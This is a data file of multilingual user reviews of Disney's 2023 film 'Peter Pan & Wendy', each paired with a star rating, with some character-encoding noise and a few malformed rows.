horrible Tinker Bell in all the other Peter Pan‚Äòs Tinker Bell is a loved bubbly energetic beautiful fairy this Tinker Bell can't act at all and is on the trashy side,0.5
Total garbage and a waste of my time. Not even my children enjoyed it!!,0.5
"Peter Pan and Wendy was one of the most high flying adventures that takes imagination to new heights, from Director David Lowery. Ever Anderson is great as Wendy, as well as Alexander is perfect as Peter Pan, alongside with Jude Law performance as Captain Hook. It's a great fun and adventurous experience that only Disney can create",5
"One would think, for the titular character, Disney would be able to find someone who can actually act. Alexander Moloney as Peter mumbles through his lines, barely smiles or even emotes, and on top of that, he sounds like his voice already dropped years ago. Perhaps I could forgive a little awkwardness if he at least sounded like a child, the way The Boy Who Never Grew Up should. I can only assume this was a nepotism cast, or Disney's executives forced a poor decision to be made for the sake of meeting their vapid, surface-level representation quota. Jim Gaffigan, on the other hand, is enjoyable on-screen, abandoning his typical softspoken, higher register for a gruffer, more piratical resonance, but maintaining his awkward and comedic persona as Smee. He fits very naturally into the character's shoes, both visually and performance-wise. In fact, all the pirates look decent‚Äîit's nice to know the company at least hasn't totally forgotten how to design a pirate. The set pieces are pretty to look at, as usual. Unfortunately, however, those minor details are the only parts of this movie worth watching. Also worth noting, there's a random circle wipe in the middle of the movie that's extremely jarring and makes no sense. Maybe they were trying to appeal to Star Wars fans? It gives a Sequel vibe the entire time. The pacing is so unbearably slow, when I thought the movie was about to end I checked the time and I was only halfway through. Overall, this is just another of many soulless live-action remakes. It doesn't even feel like they're trying anymore. Peter Pan, holding a sword to the throat of his oldest friend: üòê",1
"You did it xD !! My Fantasy cartoon turn into Horror movie again ‚ô• I really love my Tinkenbell with all her cartoon series such as Tinkenbell & Lost Treasure or Tinkenbell & Great Fairy rescue, but this Tinkenbell... :'P",0.5
"Good movie, true to the story, and well made. It could have been a little better, but it also could have been a lot worse!",4
Exellcent movie way better then the cartoon,5
I really enjoyed watching this movie with the family. I'm not sure why the bad ratings. Great score. I love the casting.,5
"A Disney sempre tem a chance de voar mais alto com os seus remakes, mas vemos que n√£o √© o que sempre acontece, principalmente nesse caso espec√≠fico que passamos quase o tempo todo com os p√©s no ch√£o enquanto assistimos a mais um live-action de Peter Pan. O filme tem uma narrativa interessante, que deveria ter sido melhor trabalhada, mas acaba destruindo tudo na falta de magia que √© preciso em um conto de fadas. At√© a paleta de cores do filme nos levam pra um realismo desnecess√°rio.",2.5
"Not fresh at all, extremely boring",1
"Ce film est mauvais. L'acteur de Peter n'a aucun charisme. L'actrice de Clochette pas terrible. Le personnage de Wendy est insupportable. Celui de Peter Pan ne sert plus √† rien. Les ""enfant"" perdus ont perdu aussi leurs saveurs du roman et des films pr√©c√©dents.",0.5
I thought it was really fun! I liked the back story. The Captain Hook actor was incredible!,5
The worst Peter Pan film of all time. What is going on at Disney? A miserable experience from beginning to end.,0.5
Abysmal. I could write an essay on each and every aspect of this movie which make it so bad but I've already wasted enough of my life on this drivel.,1
"What was that?! .. Honestly, there have been so many remakes, that even making another one was kind of nonsense.. but this... regret wasting my time watching it.",0.5
This is total disaster.,0.5
so modern and touching!!!,5
My grandma grew up with the original movie and she loved it so much so when Peter Pan & Wendy came out I watched it with her and when the movie ended she started crying saying that they ruined her favorite movie,0.5
The name of the movie is wrong!It should be named Wendy & Wendy,0.5
"carente de magia y emoci√≥n ,carente de momentos fantasiosos limit√°ndose a fotograf√≠as de paisajes y nada mas, no sorprende en absoluto ni innova tan solo es una nueva adaptaci√≥n de bajo presupuesto que pretende entablar una historia mas profunda pero falla en su cometido perdiendo su m√°gica esencia familiar torn√°ndose mucho mas lenta o incluso oscura que cualquiera de sus adaptaciones predecesoras.",0.5

This pater pen is not like the other pater pen movies but i really enjoy it ! I love the fairy I wish she had more scram time .,5
"Why is Wendy such a terrible Person? why is Peter Pan a Villain? And why is Hook much more sympathetic than the so called ‚ÄûHeros""? Where is the Message of the original Book? Questions over Question but not a good movie!",0.5
"This is one of the worst live action remakes I've seen from Disney so far. It's not as bad as Mulan but it's still pretty bad. Wendy is just straight up unlikeable in this version. Peter is so boring and with Tinker bell, she's also very bland. That's the best way to describe the film. Bland and very boring . For example, the first time we see Neverland was so life less because it's just looks like a lump of coal in the middle of the ocean. Some of The lost boys have been gender swapped. Ignoring that the reason why the lost boys are only boys in the original is because girls are more mature growing up than boys. They don't fall for Peters tricks and antics. Then there's Hook, which I've seen people praise the film because of his origin. But the origin makes Peter more like the bad guy of the story than Hook. The only good change of the film was the racist depiction of Indians which that was good, but that's it.",1
"Most of the characters were good, and the story was somewhat accurate to that of the animated classic, aside from some unnecessary changes. However, Peter Pan himself feels lifeless in this movie. Whenever Peter Pan was on screen, it was hard to watch since there was nothing interesting about the character's portrayal, just blandness. Captain Hook and Wendy carried this movie in my opinion.",1
I loved it! I enjoyed that it actually gave a back story to Peter Pan and Captain Hook. Glad the fixed the indigenous characters because let's be honest in the first one it was clearly stereotyped and offensive. I truly enjoyed this film and the actors!,5
"I really don't understand the ultra negative response to this. I do feel that Disney needs to stop remaking ever old title in their library and Crete more original content, however, this was very well done as far as adaptations go. Jude law as Captain Hook was the highlight for me. The action sequences were exciting and well done. The visual effects were great. The few songs were good but I do miss the original musical score from the animated series. Overall it's a really enjoyable movie and I'd recommend giving it a try.",4
"This is ü§Æü§Æü§Æü§Æü§Æ. I was a very BIG fan of Peter Pan and bruh‚Ä¶this? Is lefties political garbage. COME ON it's the Victorian era? She should've been more feminine. (I'm 13.) why don't they try to show us that we can be as smart and girly? Like what?? And why is Peter Pan crying? He was a hero, not a crybaby.",0.5
A twist on a classic story. They just decided to get rid of all the good parts and change anything that made sense. Honestly if they tried harder they might have been able to make it worse but it would have taken some effort.,0.5
It was alright but it didn't bring anything new new or ground breaking. It didn't quite expand the universe as I would expected.,3
"Thanks for ruining my childhood movie. Characters are poor actors, character selection poor, CGI poor. I cant even finish the movie i was jusy skimming.",0.5
"Nobody won't hate it, it lovely for Peter Pan!!!",5
Gods awful. They should be ashamed for putting out such a lifeless adaption of a beloved classic story. Didn't even feel like London or Neverland! And the main character didn't feel like Peter Pan.,0.5
"very pooring movie, i love the original much more.",0.5
I really enjoyed this movie with the unique story behind Hook and Peter.,5
A poorly made film with forced material,0.5
Bad and worse than bad.,0.5
"Esta pel√≠cula en un principio parece una recreaci√≥n de la pel√≠cula animada de 1953, pero los que ya hayan visto las pocas adaptaciones del relato original, no tardara en darse cuenta despu√©s de que esta pel√≠cula es m√°s bien otra adaptaci√≥n de dicho relato. Tiene algunos elementos de la versi√≥n animada y ciertos gui√±os, pero gran parte de la pel√≠cula se distancia de aquella versi√≥n para ser una adaptaci√≥n mucho m√°s derivada. A lo largo de la pel√≠cula, es muy evidente la diferencia que tiene con la pel√≠cula animada. Muchas cosas identificables de la pel√≠cula animada tambi√©n han sido usadas en otras adaptaciones como Peter Pan (2003) y hasta Hook (1991), ya que ambas Peter Pan, Tinker Bell y Garfio son parecidos a los de la pel√≠cula animada. En Peter Pan & Wendy es casi lo mismo, pero con unos giros diferentes. Una cosa a favor de esta pel√≠cula es que Garfio tienen m√°s profundidad y hasta hay una explicaci√≥n sobre porque Garfio y Peter se volvieron enemigos. Eso la verdad aporta bastante, ya que es algo que otras adaptaciones nunca tuvieron en cuenta. Lo que s√≠, hay pistas sobre el pasado de Peter Pan y eso es algo que se podr√≠a haber profundizado bien. Jude Law la verdad hace muy bien su papel como Garfio. Lo de Tinker Bell fue algo que llamo bastante la atenci√≥n y aqu√≠ ocurre algo curioso. En otras acciones vivas que Disney hizo de sus cl√°sicos, los cambios de etnia no fueron tan convincentes en su mayor√≠a por las actrices elegidas, pero en este caso, Yara Shahidi pega como Tinker Bell. Eso es porque tiene una facha aceptable y al menos eso hace que sea una suerte que en esta pel√≠cula, el cambio de etnia de Tinker Bell si haya funcionado de manera inesperada. Ever Anderson es deslumbrante en su papel como Wendy y presenta una versi√≥n del personaje con un car√°cter firme y que no tarde en aprender que madurar no es algo tan malo. La pel√≠cula adem√°s conserva algo que siempre fue fundamental en la historia de Peter Pan y es la cuesti√≥n sobre el crecer. Peter Pan es un ni√±o que nunca quiso crecer, pero de cierta manera madura cuando conoce a Wendy y ella en su aventura con Peter aprende que la ni√±ez no es eterna y que la madurez es inevitable. La pel√≠cula tiene presentes estos elementos sobre el crecer y se ve presente cuando Wendy trata de conocer m√°s sobre el pasado de Peter y de donde salieron los ni√±os perdidos o hasta incluso cuando Garfio comienza a recordar su pasado y que no siempre fue un cruel pirata. Se nota que tiene ese elemento importante de la historia de Peter Pan, pero plasmada desde un enfoque distinto. La pel√≠cula est√° bien ejecutada en su producci√≥n, ya que los efectos especiales son bastante buenos, tiene tambi√©n un buen vestuario y una fotograf√≠a impecable. La verdadera raz√≥n del disgusto que la gente le tiene a esta pel√≠cula es porque seguramente esperaban ver un calcado de la pel√≠cula animada y los que le dieron el buen visto son los √∫nicos que si tuvieron un mejor ojo para darse cuenta de que en realidad se trata m√°s bien de otra adaptaci√≥n del relato original. La mayor√≠a simplemente la vio desde una perspectiva err√≥nea, ya que hasta los ni√±os perdidos de esta pel√≠cula no son los mismos de la pel√≠cula animada. Aqu√≠ entra de nuevo otra cuesti√≥n que es que cada vez que se hace una acci√≥n viva de una pel√≠cula animada, algunos se quejan de que no se parece y otros de que es un gran calcado. Con esto se puede llegar a la conclusi√≥n de que la gente no sabe lo que quiere realmente y siempre inventa excusas. Claro que con los elementos y referencias que hay hacia la pel√≠cula animada, es muy f√°cil creer que esta pel√≠cula es una recreaci√≥n en vez de otra adaptaci√≥n. Disney incluso acredit√≥ esta pel√≠cula como una recreaci√≥n y eso fue un error, ya que por ese lado la pel√≠cula no tiene pinta de recreaci√≥n exactamente, sino m√°s bien de otra adaptaci√≥n del relato original. En ese aspecto, la pinta de la pel√≠cula choca con su guion porque el guion busca ser una adaptaci√≥n libre m√°s fresca, mientras la pel√≠cula busca darle la pinta que tiene el cl√°sico animado. Si la gente la ve pensando que es una recreaci√≥n de la pel√≠cula animada, desde luego es probable que la vean con malos ojos. Lo m√°s conveniente es verla como otra adaptaci√≥n m√°s del relato original y no como una recreaci√≥n. No es trabajo duro, ya que la mayor√≠a de las adaptaciones del relato de Peter Pan cuentan la misma historia, pero siempre con un enfoque distinto y Peter Pan & Wendy no es la excepci√≥n. Mi calificaci√≥n final √∫nica y v√°lida para esta pel√≠cula es un 7/10.",3.5
"Aburrida, sin sentido por momentos y muy lenta.",1.5
"People are incredibly sad. ""It's not identical to the first story, the fairy's a different colour and spoke once, blah blah blah"". This film is fantastic, entertaining, easy to watch beautifully shot and kids will absolutely love it , that is unless their sad parents haven't pushed their odd hatred of a kids movie onto them. Honestly enjoyed this more than most the others and did the children, definitely worth a watch. These reviews annoy me because they make me not watch things sometimes, but this has instilled in me that I must always watch and make my own kind up. The movie isn't real, it's fantasy, it can be changed it can be different. Every story on the planet is an adaptation of an idea from somewhere.",5
What a joke of a movie!,0.5
I don't even know what they are trying to achieve with this movie. It's like they are trying to demonize the hero and glorify the villain. I don't know why they can't just keep things simple.,0.5
"Stay Out of Neverland. What a let down from Disney. ""Peter Pan & Wendy"" fails on many aspects to me, from the story and CGI to the cinematography and acting it's all a mess. Jude Law had a decent performance as Hook but didn't do enough to be the best on screen Hook. The Darling children on the other hand were very well casted sadly with very little screen time still provided to make this feel authentic to a live action remake. One of the best points of this film was the moment we encounter the crocodile (Tick-Tock) in Dead Man's Cave, which only lasted a few minutes. From that point on we never see the conflict and terror in relation to Hook and Tick-Tock, which played a major role in the animated film. Alexander Molony's performance as Pan felt monotone at some points and was off putting, considering how charismatic and energetic the original animation was of Peter Pan. This lands as my lowest and least favourite live action remake from Disney.",1.5
"I grew up loving the story of Peter Pan. My mother read me the book, took me to the play, and we watched the cartoon together. Later on I watched and loved Hook. Now to this movie, I am greatly sadden by the writting in this production. It misses the mark by a long way, on all fronts. Peter Pan has been down graded to a minor role, who in my opinion is weak and lacks any stage presents. And was he cast to be that way...short, weak, and girlish looking.",0.5
Hollow plot. Disney is missing the mark as of late,1
"the history is boring, today don't exist the creativity",0.5
"I thought Wendy and Captain Hook were well played, even Tinkerbell performed well. However the rest of the cast seemed to be reading their lines from a card. The film added little to the Disney animated version and lost all of its charm.",2
"Nice history, script, but the CGI...",3
"Haven't seen anything as bad lately, it seems, that Disney sets the standard for terrible movies now. They were an example of a great animation and relatable characters that outgrow themselves, now all the characters are stripped of anything that was relatable and good about them.",0.5
It is beyond words. It breaks my heart and after I brought the Grand-kids home and showed them the original the next day. THE ENDING WAS SO BAD THAT YOU NEED TO LEAVE BEFORE YOU SEE IT! DO NOT Watch this movie!,1
"Its a joke of a Peter Pan movie. Wendy is given all of the strengths that are missing from Peter in the movie. He's not even likeable. Wendy is also snooty and bratish which contradicts the original depiction of Wendy where she is seen as a loving motherly figure who is obviously more mature and smarter then the boys. Jude Law as Captain Hook is the only good part of it. Everything else is legit awful. Please save yourself the time and watch the original one, Hook or even the 2003 Peter Pan Remake.",0.5
"The story is kind of fine but the movie is boring I almost fell asleep, and some characters like Peter don't matter that much and are pretty much replaced by characters like Wendy or Tigerlily this turns Peter Pan into more of a replacement character instead of one of the protagonists.",1.5
A boring disaster with absolutely no artistic value.,0.5
"Wendy la pel√≠cula hubiera sido mejor nombre, es mala la pel√≠cula y oscura Peter pan es un ni√±o llor√≥n que si lo quitas de la pel√≠cula no afecta en nada la historia, est√°s pel√≠culas est√°n llenas de un feminismo mezquino que tienen que demeritar al hombre para que dejarlo mal parado, para que poner Peter pan en el t√≠tulo si le das todo el protagonismo a Wendy???",0.5
ripped one of my childhood stories from everything that made it great,0.5
"Peter Pan & Wendy is a huge disappointment. Firstly, I'd like to point out the poor casting choice. I was shocked and unhappy to see Tinker Bell casting choice. Tinker Bell is supposed to be blonde, and here she's apparently black-haired with a dark-tan skin tone. She's giving me a more Iridessa vibe than Tinker Bell. They also do Peter Pan himself poor. Peter Pan looks nothing like how I remembered when I was a kid. Needless to say Wendy Darling herself, her hair colour does not look like an original animated film. The reason why I rated this movie a bit higher than what I would rate is because of the action. The action and the visual in this movie is surprisingly convincing that I was in Neverland. But overall, this movie is nothing but a huge flop.",1.5
"Remember the original? What if you threw everything magical about that movie and threw it away? You get this dull and unnecessarily dark ( Dark as in lightning.) movie. Every character feels like a hollowed out shell of their former selves. If I could rate this zero stars, I definitely would.",0.5
"Horrorosa. Est√° oscuro, el CGI se ve barato, y se nota que le metieron inclusi√≥n forzada a m√°s no poder. El actor de Peter Pan est√° perdido y da pena ajena, y los personajes femeninos est√°n empoderados sin raz√≥n. Lo √∫nico bueno es Garfio, el actor tiene un poco de carisma, pero hasta ah√≠ nom√°s. La pel√≠cula falla como adaptaci√≥n de la pel√≠cula animada y falla como un intento de ser algo diferente. Cuida tu tiempo y pas√° de largo est√° bazofia.",0.5
"I thought that we had left sepia and monochromatic films behind. Really though, the filters on this movie are drab and dull. Peter Pan isn't even a driving character in the story (and he is a titular character!!!) and as the film progressed, I came to dislike Wendy more and more. And oh how I wish Tinker Bell had been portrayed better. The acting was just painful to watch and rarely felt believable. I'm losing a heck of a lot of hope in Disney's remakes. I think it's time for them to move on to new content.",0.5
Another horrible movie by Disney! Why change the lost boys... and everything else...???,0.5
"N√£o temos oportunidade sequer de avaliar o desempenho do elenco, pois os personagens s√£o muito rasos e pouco explorados. O roteiro apaga muitos fatores importantes, n√£o somente da anima√ß√£o da Disney, mas da obra original em prol de personalidades caricatas e pouco complexas. A escolha das cores e ilumina√ß√£o n√£o tem qualquer justificativa al√©m de uma aparente vontade da dire√ß√£o em dar um toque ""sombrio"" para a produ√ß√£o, mas que n√£o conversa em nada com o roteiro. Considero um desperd√≠cio de atores muito bons escalados e uma tremenda perda de oportunidade de alavancar a carreira dos atores mirins que parecem promissores.",0.5
Honestly this movie should have been called girl power on neverland. It started off boring and then proceeds into girls are great and all boys are screwups and honestly the story is not even interesting. We get it disney you think all men are crap.,0.5
One of the better Disney remakes,4
Pior coisa que assisto desde Matrix 4. Um fracasso do inicio ao fim!,0.5
God that was awful! I will never get that time back‚Ä¶ Don't waste your time!,0.5
"I love this movie! All of the Peter Pan movies, in fact, I don't get why people have to be so hateful and spread negativity if this is not hurting anyone. Even the animated version was not the same, not a single one of the other live actions was the same. The point is to bring something new, exciting and maybe even modern. You can have an opinion, but if you need to insult, offend, or bring politics into it, you're automatically wrong. In other movies Peter Pan is not a redhead, Tinkerbell was not blond, Tiger Lily was white, and nobody complained about the forced exclusion. Representation matters, some people cry for nothing, something that is not hurting.",5

just boring and terrible like all of Disney's projects lately just go watch the original or hook instead they capture what the peter pan story actually is,0.5
I dare to wonder if the writers ever read the children's book or watched the beloved 1953 animated film.,0.5

This entire movie just feels like a mistake and the characters doesn't resemble the classic versions of themselves at all. Truly a waste of time.,0.5
"With the exception of Jude Law, bad performance by the actors and deconstruction of history.",0.5
"The reality is that the movie leaves a lot to be desired. The young actor who plays Peter Pan, unfortunately, did not play an influential and convincing role, he felt forced and artificial. The film is only an attempt and like ""Pinocchio"" of 2022, we can consider it a failure.",2
Definetly love it!!!,5

Pretty bad. Set aside the bad idea to revise the whole story......they did a poor job if doing it. The acting was really rough. Should have left a cherished story well alone!,0.5
"Leagues better than the original, with a much better portrayal of Tiger Lilly and an emotional core to the relationship between Peter and Hook absent in the original.",4
What did they do with the wonderful history of the books. This movie was so boring that my 4 and 6 year old nephews asked me to watch Cartoons by Cartonn. Bad adaptation,0.5
"It certainly isn't like the animated film - it's a different take on it and it's brilliant! The animated film is great for children, this live-action film is for an older audience.

Very bad and boring movies. I dont recomend watch it,0.5
Expected so little from this movie.... it still manages to disappoint.,0.5
"A must-miss, boring and just plain dull. I am not sure why this version was even made except for complete desperation to use this classic to create some quick revenue.",0.5
The movie was so poorly executed and incredible boring and cringy.,1
"Did I see a different movie than everyone else? Because this was GREAT! Disney has two live action remakes coming out within a month of each other‚Ä¶ and I think I just saw the better one. Unfortunately‚Ä¶ the lazy, soulless CGI infested one will go on to become more successful and more beloved‚Ä¶ but whatever. I'll probably like ""The Little Mermaid""‚Ä¶ but we have something really special on our hands here with ""Peter Pan & Wendy"" that is either going unnoticed, or people aren't connecting with. Disney finally makes an intelligent, thematic and well-made live-action remake‚Ä¶ and not only does it get dumped on Disney+, but the audience didn't turn up for it. That makes me, a fan of well-made *theatrical* cinema, very very unhappy. I actually really liked this movie! It definitely isn't your average Disney flick, it's made by A24's David Lowery after all, but I really appreciated it for its differences and bold creative choices. I loved Lowery's ""Pete's Dragon"" remake from a few years ago, it's a bright spark in a sea of unoriginality (I say that while also being a fan of most of the other live-action remakes Disney has done‚Ä¶ I'm a hypocrite I know), and was naturally very excited to see what Lowery could bring to the tale of ""Peter Pan""! For me at least‚Ä¶ he may have delivered one of my favourite adaptations of the source material, one that outshines the problematic Disney classic! It retains the good from that film, and I loved how the score integrated classic themes and songs from the original, while also correcting the more problematic elements and adding in much deeper layers of story, character and theme. I really loved the commentary this film had not only on growing up, but also on the passing of time. And I really loved how Captain Hook's story was woven in here. I really loved Jude Law's take on the character and even felt sympathetic to him at some points, despite his eccentric traits. And the rest of the cast was fantastic too. I couldn't imagine a better Peter Pan, and I loved the three Darling siblings! On top of it all‚Ä¶ it's a real shame this one didn't get a theatrical release. Lowery's sweeping scenery deserves to be highlighted. The cinematography was fantastic and I loved that they shot on real, practical locations than making it all a bland CGI-fest. This felt like an actual movie, not just (as Scorsese would put it) a theme-park ride. I really love that Lowery is able to make very strong art films (""The Green Knight"", ""A Ghost Story"") while at the same time crafting some of the best Disney films out there right now in ""Pete's Dragon"" and ""Peter Pan & Wendy"". I just wish the audience turned up for these‚Ä¶ I love both his Disney films (and his independent ones), so I am truly disappointed to see them not doing as well as they deserve to. Why did this one have to be stuck on Disney+? Trust me, give this movie a shot. It's worth it, and has easily become my favourite adaptation of ""Peter Pan"". Not only that‚Ä¶ but it IS the best Disney live action adaptation IN YEARS!",4.5
"Sadly disappointing. It is no longer a film for children, as it has lost its magic and joy... There is a lot of militancy instead of quality, moving away from the original work.",0.5
"Filme muito bom, hist√≥ria linda e li√ß√µes valiosas. Foi um dos filmes mais lindos que a Disney j√° fez.",5
I couldn't see anything positive in the film. It's a disaster of poor script choices from start to finish.,0.5
"A good watch. Different from the animated Peter Pan Disney movie. Good back story too, with Peter Pan and Captain Hook being friends in the past, then Captain Hook missed his mother so Peter Pan banished him from Neverland. Then Peter Pan cut off his hand so they became enemies. Captain Hook never found his mom again, and was raised by pirates. He returned to Neverland to fight Peter Pan. Wendy and her brothers live in the normal world but Wendy has a hard time following her mom's orders and growing up. After Tinkerbell and Peter Pan brought her to Neverland, it was different than how she imagined, and she misses her mother and the possibilities of the normal world. Captain Hook tries to kill the kids and Peter Pan, but doesn't succeed thanks to the help of Tinkerbell. Captain Hook supposedly falls in the ocean to his death, but in the end he is still alive and Peter Pan comes back, probably to save him. Peter doesn't stay in the normal world, even though Wendy wants him to. He says he isn't ready.",3.5
"It's very cinematic for a steaming movie. It looks like it has a huge budget. Maybe too cinematic and less fun or magical. My nostalgic memories of the original and Hook were so strong, this felt pretty sterile‚Ä¶except for Jude Law and and Jim Gaffigan's performances. Maybe they were just very conscious of being PC which costs it some whimsicality? Wendy and Peter have zero chemistry. The flying scenes are good but that's about it. I don't see many kids liking this movie.",2.5
"An Unsatisfactory Misadventure - Peter Pan & Wendy The film adaptation of ""Peter Pan & Wendy"" promised to revive the magic and emotion of the beloved classic tale. Unfortunately, the end result was a movie that fell far short of expectations. Far from capturing the enchanting and captivating essence of the original story, this version failed on multiple levels, delivering a disappointing and at times even irritating experience. One of the main issues with the film lies in its screenplay, which proved to be extremely shallow and predictable. The narrative didn't bring anything new to Peter Pan's story, following such a linear and uncreative path that it felt more like a mere imitation than a modern and inspired retelling. The scenes seemed to be there merely to fulfill obligatory requirements, without offering any depth to the relationships between the characters or exploring the richness of the fantastic world the story could provide. Furthermore, the cast failed to elevate the film's quality. The performances were generally weak and unengaging, with actors who appeared disinterested or lacking the necessary chemistry to establish convincing connections between the characters. Even iconic characters like Peter Pan and Tinker Bell couldn't convey the energy and vivacity expected of their roles, which contributed to weakening the overall narrative. Another aspect that fell short was the direction and cinematography. The stylistic and visual choices weren't able to create a magical and captivating atmosphere. Instead, it often felt like watching a low-budget theatrical performance, lacking the grandeur and charm that a Peter Pan film should provide. The soundtrack also deserves a mention, as it failed to convey the emotion and magic that are fundamental to engaging the audience in a story like this. The songs were forgettable and added nothing to the film experience, further disconnecting viewers from the plot. In conclusion, ""Peter Pan & Wendy"" failed in its attempt to revive the magic and enchantment of the classic story. With a weak screenplay, lackluster performances, and uninspired direction, the film couldn't meet fans' expectations and ended up being a disappointing experience. If you're a Peter Pan enthusiast, it's better to revisit previous versions or delve into the original book to truly capture the essence of this enchanting tale.",1

I almost felt the actress recorded random faces in front of a chroma and they added randomly in the movie. Peter Pan has 0 importance in the movie. There is one transition in the middle of the movie that look made with Sony Vegas (like a circle which closes and there is another scene). Tigrilla has more importance than Peter....

"""Peter Pan & Wendy"" √© uma triste tentativa de revitalizar um cl√°ssico amado pelos f√£s. Desde o in√≠cio, fica evidente que os produtores n√£o tinham a menor no√ß√£o do que tornava o filme original especial. Ao inv√©s de honrar a ess√™ncia do original, eles entregaram uma produ√ß√£o desleixada e desconectada. A trama do filme √© um emaranhado confuso de eventos aleat√≥rios, sem qualquer coer√™ncia com a narrativa original. Personagens ic√¥nicos foram relegados a pap√©is secund√°rios sem prop√≥sito, enquanto outros personagens sem carisma tentam assumir o protagonismo, falhando miseravelmente. A dire√ß√£o √© ca√≥tica e sem foco. As cenas de a√ß√£o s√£o mal coreografadas, tem efeitos especiais de qualidade flutuante, resultando em sequ√™ncias desconexas e sem emo√ß√£o. A cinematografia, que antes era uma marca registrada do filme original, √© substitu√≠da por uma est√©tica gen√©rica e sem inspira√ß√£o. O maior pecado de ""Peter Pan & Wendy"" √© a completa destrui√ß√£o da mensagem central do filme original. No final das contas, o que os f√£s querem √© um produto bom. E ""Peter Pan & Wendy"" n√£o √© nem de longe uma representa√ß√£o digna do filme original. Os f√£s merecem algo melhor, algo que honre a obra original e ofere√ßa uma experi√™ncia aut√™ntica e emocionante. Infelizmente, ""Peter Pan & Wendy"" n√£o √© esse filme. A maior for√ßa do filme √© o Capit√£o Gancho, numa boa interpreta√ß√£o de Jude Law, Mas ele est√° sozinho em um filme sem alma, vazio.",1
"Transformou o Peter em vil√£o. Transformou a Wendy em ultra super poderosa e mandona, Cen√°rio triste. Vil√µes abobados. N√£o remete em nada √† anima√ß√£o de 1953, se era para ser o live action. S√≥ mais um filme gen√©rico de Peter Pan.",0.5
"n√£o achei bom, o filme n√£o retrata com qualidade uma hist√≥ria, nem busca seguir a obra original, ent√£o, ao meu ver ficou sem p√© nem cabe√ßa, atua√ß√µes fracas, apenas o Jude Law teve alguma relev√¢ncia.",0.5
Incr√≠vel como a Disney sabe como acabar com uma obra!,0.5
"Nunca vi um filme t√£o ruim da disney como esse, desde quando Peter Pan virou vil√£o, ainda toma um tapa na cara! Filme escuro, Neverland √© muito feia e sem gra√ßa. Capit√£o Gancho se apresentou como uma v√≠tima, n√£o como vil√£o, relativiza√ß√£o do bem e mal escancarada. Wendy dando aula da Cartilha Vermelha. Filme deprimente.",0.5

"It is remarkable how much effort Disney puts into disassembling and destroying their own legacy. All the fantastic wonders and the magic that has built up in decades, all those beautifully crafted (animated) movies that shaped generations of childrens - has turned into something like this. It's saddening. Everything the book stands for got removed and replaced, all the magic got forcefully taken out of it. What remains? An empty shell that has a indecipherable label on it. Sigh.",1
"sad to see how a company like Disney decided not to care anymore about fidelity, quality and public. It was tiring to see the film even with good performances, it has no life, it is dull and so on.",0.5

"Disregarding all the casting choices made for this movie, the overall movie was at best bland and uninspiring. The CGI used in the movie makes it feel more dark and bleak where as the original animated movie was more vibrant and lively as well as more immersive than this movie. I really just wish that Disney would make original stories rather than doing live action after live action remake on stories that have been shown repeatedly.",1
"O roteiro n√£o explora os aspectos psicol√≥gicos e emocionais do amadurecimento e da busca pela eterna juventude, que s√£o elementos-chave da hist√≥ria de Peter Pan. Essa falta de profundidade resulta em uma experi√™ncia cinematogr√°fica rasa e desinteressante. Al√©m disso, a escolha do elenco tamb√©m foi questionada. Muitos espectadores sentiram que os atores n√£o conseguiram transmitir a ess√™ncia dos personagens de forma convincente. O Peter Pan interpretou por um jovem ator sem carisma e a Tinker Bell que n√£o cativa como a fada travessa que tolera, para a falta de conex√£o emocional com a trama. a adapta√ß√£o de Peter Pan em 2023 falhou em capturar a ess√™ncia e o encanto da hist√≥ria original. Com uma narrativa previs√≠vel, personagens pouco apresentados e uma abordagem simplista dos temas, o filme deixa a desejar. A falta de originalidade e a falta de conex√£o emocional com a trama s√£o pontos negativos que n√£o conseguem ser compensados, pois at√© a paisagem da terra perdida e limitado e sem magia. Infelizmente, essa vers√£o de Peter Pan n√£o atende √†s expectativas e acaba se perdendo na tentativa de recriar a magia atemporal desse cl√°ssico conto de fadas.",0.5

"Totally disappointed, it had no imagination to it, I do not like the casting choices, it felt rushed and lack of emotion, to much has been changed to feel like the original at all; even being a remake this had to much of a modern day feel. The characters lack depth and connection to each other. The acting from majority of the cast felt void of expression and emotion. Disney needs to stop changing these classics to fit whatever new agenda they are going for, the classics are being ruined and it is very sad to see so many parts skipped over or changed. The characters should resemble the cartoons and their personalities as well. This became boring quite quickly, I had hope for this, but it was a let down. Changing the lost boys was a horrible decision and skipping over Peter's shadow scene was a bad idea, took away a lot of nostalgia that would've been felt if they would've kept those scenes or kept it the way it was supposed to be. I do not feel like Tinker bell was portrayed well either, the actresses had only one expression and for a scene without talking I'd like to see more expression in the actors face or attitude, tinker bell wasn't even a jealous type which was a total change of her character outside of her appearance being altered as well. I would not recommend this movie.",0.5

It's Patvitr Pan & Wendy with the Lost they thems.,0.5
"I wish I understood Disney's fascination with taking its outstanding animated back catalogue, stripping it of anything remotely interesting or genuine, then slapping it onto streaming. This movie lacks the poise and nuance of its source material; Wendy becomes the obligatory ""girl boss"" with no narrative deficiencies, Peter is neutered and secondary to the plot (ironic, given the film's title), and Tinkerbell is‚Ä¶ well, when she actually does anything, I'll let you know. Captain Hook lacks the menace and intensity of the original antagonists, and in many ways, comes across more sympathetic than many of the protagonists, owing to their lack of charisma and poor writing. The original's tale of growing up and accepting adulthood is a tale that's stood the test of time, with each character a clever metaphor for the human condition and existential behaviours. It's clear everyone involved in this film has no idea what a metaphor is, much less how to put one on the screen, with this ‚Äòremake' likely be forgotten in a few month's time. A weak and boring take on a classic story.",0.5
"Felt like every other movie I've watched I was so excited to have a new reboot of yet another Disney classic but this this was a flop. There were numerous ways it could've been so much better. They first could've redone the movie and retold the story. Just copy and paste most of the original Peter Pan story. But they didn't. Instead they took out some of the most memorable parts‚Äîthe mermaids the exploration of the island‚Äîand just replaced it with a generic story that didn't make sense. My next issue was the retitling. The new ""Peter Pan and Wendy"" title made me think it would either be a coming of age romance between the two main characters or some growth of friendship. Instead it was plain and boring with nothing new. And finally it was so bland visually. The whole thing about Neverland is that it's this magical place where you never grow up and it's beautiful. Instead they just have a big green open field. With nothing magical about it‚Äîit's just boring. Would not recommend watching, but if you want something with Peter Pan go watch ""Hook"" or ""Pan"". Not worth the time. Only thing I can say is the child actors were very good.",2.5

"Caraca, como conseguiram acabar com meu personagem predileto dos filmes da Disney?",0.5
"I feel like it couldn't decide what kind of retelling it wanted to be. Sometimes it felt like it was trying to be an edgier version then went back to being safe. It had some good scenes that could have had the potential to make it a great movie, but the majority fell flat. It was simultaneously too slow and too rushed and the new additions to the world building somehow made it make less sense than previous versions. I could see there was an attempt to build on this classic story and the ideas were solid but the execution was meh. I really wanted it to be good, but it was just ok.",2.5
